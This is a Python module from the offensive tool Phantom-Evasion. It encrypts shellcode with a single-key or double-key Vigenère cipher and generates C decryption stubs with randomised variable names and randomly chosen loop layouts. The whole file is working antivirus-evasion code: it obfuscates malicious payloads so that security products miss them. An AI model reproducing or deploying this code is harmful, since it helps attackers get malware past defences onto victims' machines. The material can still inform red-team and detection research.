
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################


import os,sys
import random,string
from time import sleep
from Crypthelper import Printable
from Crypthelper import KeyGen
from Crypthelper import RandVarname
from platform import python_version
     
def Vigenere(data,key):

    while(len(key)<len(data)):

        key = key*2

    if python_version()[0] == "2":

        flag = 0
        crypted = ""

        for b in data:
            if flag == len(key)-1:
                crypted += chr((ord(b) + ord(key[flag])) % 256)
                flag = 0
            else: 
                crypted += chr((ord(b) + ord(key[flag])) % 256)
                flag += 1

        return crypted

    else:

        data=data.decode('unicode-escape').encode('latin-1')
        
        return bytes(((x + y) % 256) for x, y in zip(data,key[:len(data)]))



def VigenereEncrypt(shellcode,bufname,memptr=""):

    key=KeyGen(random.randint(32,128))

    if python_version()[0] == "2":

        e_shell = Vigenere(shellcode.decode('string-escape'),key)
    else:
        e_shell = Vigenere(shellcode.encode('latin-1'),key) 

    p_shell = Printable(e_shell) 
    p_key = Printable(key)

    Randflag1 = RandVarname()
    Randflag2 = RandVarname()
    keyname = RandVarname()

    Vigenere_stub = ""

    if "*$#FILE*" in bufname:
        Flag=True
        bufname=bufname.replace("*$#FILE*","")

    Encoded_buffer = p_shell

    bufname = memptr or bufname

    #Encoded_buffer = "unsigned char " + bufname + "[] = {" + printable_shellcode.replace("\\x",",0x")[1:] + "};\n"

    StubSelect = random.randint(1,4)

    if StubSelect == 1:

        Vigenere_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
        Vigenere_stub += "unsigned char " + keyname + " [] = \"" + p_key + "\";\n"
        Vigenere_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < " + str(len(e_shell)) + "; " + Randflag1 +"++){\n"
        Vigenere_stub += "if(" + Randflag2 + " == sizeof(" + keyname + ")-2){\n"
        Vigenere_stub += bufname + "[" + Randflag1 + "]  = (unsigned char)(((" + bufname + "[" + Randflag1 + "] - " + keyname + "[" + Randflag2 + "]) + 256) % 256);\n"
        Vigenere_stub += Randflag2 + " = 0;\n}" 
        Vigenere_stub += "else{\n"
        Vigenere_stub += bufname + "[" + Randflag1 + "]  = (unsigned char)(((" + bufname + "[" + Randflag1 + "] - " + keyname + "[" + Randflag2 + "]) + 256) % 256);\n"
        Vigenere_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"

    if StubSelect == 2:

        Vigenere_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
        Vigenere_stub += "unsigned char " + keyname + " [] = \"" + p_key + "\";\n"
        Vigenere_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < " + str(len(e_shell)) + ";" + Randflag1 +"++){\n"
        Vigenere_stub += bufname + "[" + Randflag1 + "]  = (unsigned char)(((" + bufname + "[" + Randflag1 + "] - " + keyname + "[" + Randflag2 + "]) + 256) % 256);\n"
        Vigenere_stub += "if(" + Randflag2 + " == sizeof(" + keyname + ")-2){\n"
        Vigenere_stub += Randflag2 + " = 0;\n}" 
        Vigenere_stub += "else{\n"
        Vigenere_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"

    if StubSelect == 3:

        Vigenere_stub += "unsigned char " + keyname + " [] = \"" + p_key + "\";\n"
        Vigenere_stub += "int " + Randflag1 + " = 0;\n"
        Vigenere_stub += "int " + Randflag2 + " = 0;\n"
        Vigenere_stub += "while(" + Randflag1 + " < " + str(len(e_shell)) + "){\n"
        Vigenere_stub += "if(" + Randflag2 + " == sizeof(" + keyname + ")-2){\n"
        Vigenere_stub += bufname + "[" + Randflag1 + "]  = (unsigned char)(((" + bufname + "[" + Randflag1 + "] - " + keyname + "[" + Randflag2 + "]) + 256) % 256);\n"
        Vigenere_stub += Randflag2 + " = 0;\n}" 
        Vigenere_stub += "else{\n"
        Vigenere_stub += bufname + "[" + Randflag1 + "]  = (unsigned char)(((" + bufname + "[" + Randflag1 + "] - " + keyname + "[" + Randflag2 + "]) + 256) % 256);\n"
        Vigenere_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Vigenere_stub += Randflag1 + " +=1;}\n"

    if StubSelect == 4:

        Vigenere_stub += "unsigned char " + keyname + " [] = \"" + p_key + "\";\n"
        Vigenere_stub += "int " + Randflag1 + " = 0;\n"
        Vigenere_stub += "int " + Randflag2 + " = 0;\n"
        Vigenere_stub += "while(" + Randflag1 + " < " + str(len(e_shell)) + "){\n"
        Vigenere_stub += bufname + "[" + Randflag1 + "]  = (unsigned char)(((" + bufname + "[" + Randflag1 + "] - " + keyname + "[" + Randflag2 + "]) + 256) % 256);\n"
        Vigenere_stub += "if(" + Randflag2 + " == sizeof(" + keyname + ")-2){\n"
        Vigenere_stub += Randflag2 + " = 0;\n}" 
        Vigenere_stub += "else{\n"
        Vigenere_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Vigenere_stub += Randflag1 + " +=1;}\n"

    return (Encoded_buffer,Vigenere_stub)


def DoubleKeyVigenereEncrypt(shellcode,bufname,memptr=""):

    key1 = KeyGen(random.randint(32,128))
    key2 = KeyGen(random.randint(32,128))

    Realkey = Vigenere(key1,key2)

    if python_version()[0] == "2":

        e_shell = Vigenere(shellcode.decode('string-escape'),Realkey)
    else:
        e_shell = Vigenere(shellcode.encode('latin-1'),Realkey) 

    p_shell = Printable(e_shell)
    p_key1 = Printable(key1)
    p_key2 = Printable(key2)

    Randflag1 = RandVarname()
    Randflag2 = RandVarname()
    Randflag4 = RandVarname()
    keyname1 = RandVarname()
    keyname2 = RandVarname()
    keynamestep1 = RandVarname()
    keynamestep2 = RandVarname()

    Vigenere_stub = ""

    if "*$#FILE*" in bufname:
        
        Flag=True
        bufname=bufname.replace("*$#FILE*","")

    Encoded_buffer = p_shell

    bufname = memptr or bufname

    StubSelect= random.randint(1,4)

    if StubSelect == 1:

        Vigenere_stub += "int " + Randflag1 + ";\n"
        Vigenere_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Vigenere_stub += "unsigned char " + keyname1 + " [] = \"" + p_key1 + "\";\n"
        Vigenere_stub += "unsigned char " + keyname2 + " [] = \"" + p_key2 + "\";\n"
        Vigenere_stub += "unsigned char " + keynamestep1 + " [sizeof(" + keyname1 + ")-1];\n"
        Vigenere_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < sizeof(" + keyname1 + ")-1; " + Randflag1 +"++){\n"
        Vigenere_stub += "if(" + Randflag2 + " == sizeof(" + keyname2 + ")-2){\n"
        Vigenere_stub += keynamestep1 + "[" + Randflag1 + "]  = (unsigned char)((" + keyname1 + "[" + Randflag1 + "] + " + keyname2 + "[" + Randflag2 + "]) % 256);\n"
        Vigenere_stub += Randflag2 + " = 0;\n}"
        Vigenere_stub += "else{\n"
        Vigenere_stub += keynamestep1 + "[" + Randflag1 + "]  = (unsigned char)((" + keyname1 + "[" + Randflag1 + "] + " + keyname2 + "[" + Randflag2 + "]) % 256);\n"
        Vigenere_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
        Vigenere_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < " + str(len(e_shell)) + "; " + Randflag1 +"++){\n"
        Vigenere_stub += "if(" + Randflag4 + " == sizeof(" + keyname1 + ")-2){\n"
        Vigenere_stub += bufname + "[" + Randflag1 + "]  = (unsigned char)(((" + bufname + "[" + Randflag1 + "] - " + keynamestep1 + "[" + Randflag4 + "]) + 256) % 256);\n"
        Vigenere_stub += Randflag4 + " = 0;\n}" 
        Vigenere_stub += "else{\n"
        Vigenere_stub += bufname + "[" + Randflag1 + "]  = (unsigned char)(((" + bufname + "[" + Randflag1 + "] - " + keynamestep1 + "[" + Randflag4 + "]) + 256) % 256);\n"
        Vigenere_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}"  

    if StubSelect == 2:

        Vigenere_stub += "int " + Randflag1 + ";\n"
        Vigenere_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Vigenere_stub += "unsigned char " + keyname2 + " [] = \"" + p_key2 + "\";\n"
        Vigenere_stub += "unsigned char " + keyname1 + " [] = \"" + p_key1 + "\";\n"
        Vigenere_stub += "unsigned char " + keynamestep1 + " [sizeof(" + keyname1 + ")-1];\n"
        Vigenere_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < sizeof(" + keyname1 + ")-1; " + Randflag1 +"++){\n"
        Vigenere_stub += keynamestep1 + "[" + Randflag1 + "]  = (unsigned char)((" + keyname1 + "[" + Randflag1 + "] + " + keyname2 + "[" + Randflag2 + "]) % 256);\n"
        Vigenere_stub += "if(" + Randflag2 + " == sizeof(" + keyname2 + ")-2){\n"
        Vigenere_stub += Randflag2 + " = 0;\n}"
        Vigenere_stub += "else{\n"
        Vigenere_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
        Vigenere_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < " + str(len(e_shell)) + "; " + Randflag1 +"++){\n"
        Vigenere_stub += bufname + "[" + Randflag1 + "]  = (unsigned char)(((" + bufname + "[" + Randflag1 + "] - " + keynamestep1 + "[" + Randflag4 + "]) + 256) % 256);\n"
        Vigenere_stub += "if(" + Randflag4 + " == sizeof(" + keyname1 + ")-2){\n"
        Vigenere_stub += Randflag4 + " = 0;\n}" 
        Vigenere_stub += "else{\n"
        Vigenere_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}" 

    if StubSelect == 3:

        Vigenere_stub += "int " + Randflag1 + " = 0;\n"
        Vigenere_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Vigenere_stub += "unsigned char " + keyname1 + " [] = \"" + p_key1 + "\";\n"
        Vigenere_stub += "unsigned char " + keyname2 + " [] = \"" + p_key2 + "\";\n"
        Vigenere_stub += "unsigned char " + keynamestep1 + " [sizeof(" + keyname1 + ")-1];\n"
        Vigenere_stub += "while(" + Randflag1 + " < sizeof(" + keyname1 + ")-1){\n"
        Vigenere_stub += "if(" + Randflag2 + " == sizeof(" + keyname2 + ")-2){\n"
        Vigenere_stub += keynamestep1 + "[" + Randflag1 + "]  = (unsigned char)((" + keyname1 + "[" + Randflag1 + "] + " + keyname2 + "[" + Randflag2 + "]) % 256);\n"
        Vigenere_stub += Randflag2 + " = 0;\n}"
        Vigenere_stub += "else{\n"
        Vigenere_stub += keynamestep1 + "[" + Randflag1 + "]  = (unsigned char)((" + keyname1 + "[" + Randflag1 + "] + " + keyname2 + "[" + Randflag2 + "]) % 256);\n"
        Vigenere_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Vigenere_stub += Randflag1 + " += 1;}\n"
        Vigenere_stub += Randflag1 + " = 0;\n"
        Vigenere_stub += "while(" + Randflag1 + " < " + str(len(e_shell)) + "){\n"
        Vigenere_stub += "if(" + Randflag4 + " == sizeof(" + keyname1 + ")-2){\n"
        Vigenere_stub += bufname + "[" + Randflag1 + "]  = (unsigned char)(((" + bufname + "[" + Randflag1 + "] - " + keynamestep1 + "[" + Randflag4 + "]) + 256) % 256);\n"
        Vigenere_stub += Randflag4 + " = 0;\n}" 
        Vigenere_stub += "else{\n"
        Vigenere_stub += bufname + "[" + Randflag1 + "]  = (unsigned char)(((" + bufname + "[" + Randflag1 + "] - " + keynamestep1 + "[" + Randflag4 + "]) + 256) % 256);\n"
        Vigenere_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
        Vigenere_stub += Randflag1 + " += 1;}\n"   

    if StubSelect == 4:

        Vigenere_stub += "int " + Randflag1 + " = 0;\n"
        Vigenere_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Vigenere_stub += "unsigned char " + keyname2 + " [] = \"" + p_key2 + "\";\n"
        Vigenere_stub += "unsigned char " + keyname1 + " [] = \"" + p_key1 + "\";\n"
        Vigenere_stub += "unsigned char " + keynamestep1 + " [sizeof(" + keyname1 + ")-1];\n"
        Vigenere_stub += "while(" + Randflag1 + " < sizeof(" + keyname1 + ")-1){\n"
        Vigenere_stub += keynamestep1 + "[" + Randflag1 + "]  = (unsigned char)((" + keyname1 + "[" + Randflag1 + "] + " + keyname2 + "[" + Randflag2 + "]) % 256);\n"
        Vigenere_stub += "if(" + Randflag2 + " == sizeof(" + keyname2 + ")-2){\n"
        Vigenere_stub += Randflag2 + " = 0;\n}"
        Vigenere_stub += "else{\n"
        Vigenere_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Vigenere_stub += Randflag1 + " += 1;}\n"
        Vigenere_stub += Randflag1 + " = 0;\n"
        Vigenere_stub += "while(" + Randflag1 + " < " + str(len(e_shell)) + "){\n"
        Vigenere_stub += bufname + "[" + Randflag1 + "]  = (unsigned char)(((" + bufname + "[" + Randflag1 + "] - " + keynamestep1 + "[" + Randflag4 + "]) + 256) % 256);\n"
        Vigenere_stub += "if(" + Randflag4 + " == sizeof(" + keyname1 + ")-2){\n"
        Vigenere_stub += Randflag4 + " = 0;\n}" 
        Vigenere_stub += "else{\n"
        Vigenere_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
        Vigenere_stub += Randflag1 + " += 1;}\n"    
 
    return (Encoded_buffer,Vigenere_stub)